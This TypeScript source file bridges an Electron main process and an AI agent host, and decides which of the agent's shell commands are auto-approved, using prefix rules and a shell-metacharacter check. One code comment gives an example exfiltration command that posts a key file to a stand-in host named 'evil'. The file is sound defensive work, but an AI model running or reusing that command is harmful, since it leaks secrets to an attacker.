/**
 * AgentBridge —— 主进程与 agent-host(utilityProcess) 之间的桥。
 *
 * - 负责 spawn 宿主进程；崩溃后拒绝全部在途命令、广播 fatal host.error，
 *   下一次 call() 时惰性重启（会话状态随宿主进程存亡，重启不恢复在途会话）
 * - 命令-响应按 id 关联（Promise 化，默认 30s 超时）
 * - 权限请求按风险策略就地裁决或转发渲染进程（10 分钟无人裁决自动拒绝）
 * - 会话事件/用量事件广播给所有窗口
 */

import { randomUUID } from "node:crypto";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import {
  type HostCommand,
  type HostEvent,
  IPC,
  type PermissionMode,
  type PermissionRequest,
  type QuestionRequest,
} from "@spcode/shared";
import { type UtilityProcess, utilityProcess, type WebContents } from "electron";

const __dirname = dirname(fileURLToPath(import.meta.url));

/** 权限请求转发渲染进程后的裁决超时：超时按拒绝回执宿主（评审 P1-1） */
const PERMISSION_TIMEOUT_MS = 10 * 60_000;

/** 命令-响应默认超时（评审 P1-8）；长调用（如 theme.generate 跑模型）由调用方覆盖 */
const CALL_TIMEOUT_MS = 30_000;

type EventListener = (event: HostEvent) => void;

/** 权限裁决结果：auto-approve=就地放行（不回渲染进程）；ask=弹窗等用户裁决 */
export type PermissionDecision = "auto-approve" | "ask";

/** 从工具参数里提取 shell 命令文本（bash/powershell 的 args.command） */
function extractShellCommand(args: unknown): string | null {
  if (args && typeof args === "object" && "command" in args) {
    const c = (args as { command?: unknown }).command;
    if (typeof c === "string") return c;
  }
  return null;
}

/**
 * 免审批规则匹配（权限卡「总允许」沉淀，Finch 式）：仅 bash/powershell 参与；
 * 前缀匹配且要求 token 边界（规则 "git push" 命中 "git push origin"，不命中 "git pushback"）。
 * 评审 R3-C5：含 shell 元字符（; | & > < 换行 反引号 $() 的复合命令一律不匹配——
 * 「首段命中即放行整条」会把尾巴里的写入/外传一起免审（如 "pnpm test; curl -d @key evil"）。
 */
const SHELL_METACHARS = /[;|&<>\n`$]/;

export function matchesPermissionRule(command: string, rule: string): boolean {
  const r = rule.trim().replace(/\s+/g, " ");
  if (!r) return false;
  if (SHELL_METACHARS.test(command)) return false; // 必须在空白归一前判（\n 会被归一成空格）
  const cmd = command.trim().replace(/\s+/g, " ");
  if (!cmd) return false;
  return cmd === r || (cmd.startsWith(r) && cmd[r.length] === " ");
}

/**
 * 权限裁决（纯函数，导出供单测）：
 * - danger 永远弹窗，免审批规则不适用（不可逆操作没有「总允许」）
 * - outward（对外动作/网络域名询问）两种权限模式都弹窗
 * - write 在 ask 模式弹窗、act 模式放行；readonly 不会到达这里
 * - 免审批规则命中（仅 bash/powershell 的 write/outward）时免弹窗
 */
export function decidePermission(
  request: PermissionRequest,
  mode: PermissionMode,
  rules: string[],
): PermissionDecision {
  if (request.risk === "danger") return "ask";
  const isShell = request.toolName === "bash" || request.toolName === "powershell";
  if (isShell && (request.risk === "write" || request.risk === "outward")) {
    const cmd = extractShellCommand(request.args);
    if (cmd && rules.some((r) => matchesPermissionRule(cmd, r))) return "auto-approve";
  }
  if (request.risk === "outward") return "ask";
  if (request.risk === "write" && mode === "ask") return "ask";
  return "auto-approve";
}

export class AgentBridge {
  private child: UtilityProcess | null = null;
  private readyPromise: Promise<void> | null = null;
  private pending = new Map<string, { resolve: (v: unknown) => void; reject: (e: Error) => void }>();
  private listeners = new Set<EventListener>();
  /** 渲染进程未决的权限请求（带超时兜底——评审 P1-1） */
  private pendingPermissions = new Map<string, { request: PermissionRequest; timer: ReturnType<typeof setTimeout> }>();
  /** 渲染进程未决的结构化提问（重播给重建窗口用；评审 R3-C11）——宿主侧 30 分钟超时会发 question.resolved 兜底 */
  private pendingQuestions = new Map<string, QuestionRequest>();
  private getPermissionMode: () => PermissionMode;
  private getPermissionRules: () => string[];

  constructor(opts: { getPermissionMode: () => PermissionMode; getPermissionRules?: () => string[] }) {
    this.getPermissionMode = opts.getPermissionMode;
    this.getPermissionRules = opts.getPermissionRules ?? (() => []);
  }

  /** 订阅宿主事件（session.event / usage / host.error 等） */
  onEvent(listener: EventListener): () => void {
    this.listeners.add(listener);
    return () => this.listeners.delete(listener);
  }

  /** 主进程本地产生的事件（定时任务触发等）广播给所有监听者与绑定窗口 */
  emitLocal(event: HostEvent): void {
    this.broadcast(event);
  }

  private broadcast(event: HostEvent): void {
    for (const l of this.listeners) l(event);
  }

  start(): Promise<void> {
    if (this.readyPromise) return this.readyPromise;
    this.readyPromise = new Promise<void>((resolveReady, rejectReady) => {
      const entry = join(__dirname, "agent-host.mjs");
      const child = utilityProcess.fork(entry, [], {
        serviceName: "spcode-agent-host",
        stdio: "pipe",
      });
      this.child = child;

      const onEvent = (event: HostEvent) => {
        if (event.type === "ready") {
          // ready 也广播给监听者：宿主重启后主进程需要据此重推设置等运行时状态
          this.broadcast(event);
          resolveReady();
          return;
        }
        this.routeEvent(event);
      };
      child.on("message", (msg: unknown) => onEvent(msg as HostEvent));
      child.stderr?.on("data", (d: Buffer) => {
        console.error("[agent-host]", d.toString());
      });
      child.once("exit", (code) => {
        console.error(`[agent-bridge] host exited with code ${code}`);
        this.child = null;
        this.readyPromise = null;
        const err = new Error(`agent-host exited (code ${code})`);
        // 评审 R3-C10：宿主在 ready 前退出，必须 reject 在途 readyPromise——
        // 否则 await start() 永久悬挂（连 call() 的 30s 超时都在它之后才设置）
        rejectReady(err);
        for (const p of this.pending.values()) p.reject(err);
        this.pending.clear();
        // 宿主已死，其内的权限请求随之蒸发；清掉转发记录，避免重启后错配
        for (const p of this.pendingPermissions.values()) clearTimeout(p.timer);
        this.pendingPermissions.clear();
        this.pendingQuestions.clear();
        this.broadcast({ type: "host.error", message: err.message, fatal: true });
      });
      child.once("error", (e) => rejectReady(e));
    });
    return this.readyPromise;
  }

  private routeEvent(event: HostEvent): void {
    if (event.type === "response") {
      const p = this.pending.get(event.id);
      if (p) {
        this.pending.delete(event.id);
        if (event.success) p.resolve(event.data);
        else p.reject(new Error(event.error ?? "unknown host error"));
      }
      return;
    }
    if (event.type === "permission.request") {
      this.adjudicate(event.request);
      return;
    }
    // 提问跟踪（评审 R3-C11）：request 记账、resolved 销账，bindWindow 据此重播
    if (event.type === "question.request") {
      this.pendingQuestions.set(event.request.requestId, event.request);
      this.broadcast(event);
      return;
    }
    if (event.type === "question.resolved") {
      this.pendingQuestions.delete(event.requestId);
      this.broadcast(event);
      return;
    }
    this.broadcast(event);
  }

  /** 权限策略：danger 与 outward 永远询问；write 在 ask 模式询问、act 模式放行；免审批规则命中的 shell 命令放行 */
  private adjudicate(request: PermissionRequest): void {
    if (decidePermission(request, this.getPermissionMode(), this.getPermissionRules()) === "auto-approve") {
      this.post({ type: "permission.reply", payload: { requestId: request.requestId, approved: true } });
      return;
    }
    // 超时兜底：广播到 0 个窗口（关窗的定时任务场景）时按拒绝收尾，工具调用不会永久挂死
    const timer = setTimeout(() => {
      this.replyPermission(request.requestId, false);
    }, PERMISSION_TIMEOUT_MS);
    this.pendingPermissions.set(request.requestId, { request, timer });
    this.broadcast({ type: "permission.request", request });
  }

  /**
   * 渲染进程 / 远程端回复权限确认。
   * by 标记裁决来源（远程控制 M3 双端撤卡）：成功后广播 permission.resolved，
   * 另一端据此关闭同 requestId 的批准卡；10 分钟超时兜底走默认 "local"。
   */
  replyPermission(requestId: string, approved: boolean, by: "local" | "remote" = "local"): void {
    const p = this.pendingPermissions.get(requestId);
    if (!p) return;
    this.pendingPermissions.delete(requestId);
    clearTimeout(p.timer);
    this.post({ type: "permission.reply", payload: { requestId, approved } });
    this.emitLocal({ type: "permission.resolved", requestId, approved, by });
  }

  /** 渲染进程回复结构化提问（AskUserQuestion 工具） */
  replyQuestion(requestId: string, answers: Record<string, string>): void {
    this.pendingQuestions.delete(requestId);
    this.post({ type: "question.reply", payload: { requestId, answers } });
    // 双端撤卡（与 permission.resolved 同语义）：宿主侧 resolve 后会再广播一次，幂等
    this.emitLocal({ type: "question.resolved", requestId });
  }

  private post(cmd: HostCommand): void {
    this.child?.postMessage(cmd);
  }

  /** 推送无需响应的命令（fire-and-forget，如设置下发） */
  push(cmd: HostCommand): void {
    this.post(cmd);
  }

  /** 发送带 id 的命令并等待响应；默认 30s 超时（宿主卡死时 UI 不再无限转圈——评审 P1-8）。
   *  总超时包住 start()：宿主启动即崩时 readyPromise 会拒绝（R3-C10），这里再兜一层竞态 */
  async call<T = unknown>(cmd: Extract<HostCommand, { id: string }>, opts?: { timeoutMs?: number }): Promise<T> {
    const timeoutMs = opts?.timeoutMs ?? CALL_TIMEOUT_MS;
    let timer: ReturnType<typeof setTimeout>;
    const timeout = new Promise<never>((_resolve, reject) => {
      timer = setTimeout(
        () => reject(new Error(`宿主命令 ${cmd.type} 超过 ${Math.round(timeoutMs / 1000)}s 未响应`)),
        timeoutMs,
      );
    });
    try {
      return await Promise.race([this.callInner<T>(cmd), timeout]);
    } finally {
      clearTimeout(timer!);
      this.pending.delete(cmd.id); // 超时/失败清账（迟到响应落地即弃，不泄漏挂账）
    }
  }

  private async callInner<T>(cmd: Extract<HostCommand, { id: string }>): Promise<T> {
    await this.start();
    return new Promise<T>((resolve, reject) => {
      this.pending.set(cmd.id, { resolve: resolve as (v: unknown) => void, reject });
      this.post(cmd);
    });
  }

  /** 便捷方法：构造带新 id 的命令 */
  static withId<T extends Omit<Extract<HostCommand, { id: string }>, "id">>(cmd: T): T & { id: string } {
    return { ...cmd, id: randomUUID() };
  }

  bindWindow(wc: WebContents): () => void {
    // 重播未决权限请求与提问：macOS 关窗不退出，新窗口重建后仍应看到等待中的卡片
    for (const p of this.pendingPermissions.values()) {
      if (!wc.isDestroyed()) wc.send(IPC.hostEvent, { type: "permission.request", request: p.request });
    }
    for (const q of this.pendingQuestions.values()) {
      if (!wc.isDestroyed()) wc.send(IPC.hostEvent, { type: "question.request", request: q });
    }
    return this.onEvent((event) => {
      if (!wc.isDestroyed()) wc.send(IPC.hostEvent, event);
    });
  }

  async dispose(): Promise<void> {
    this.post({ type: "shutdown" });
    this.child?.kill();
    this.child = null;
    this.readyPromise = null;
  }
}
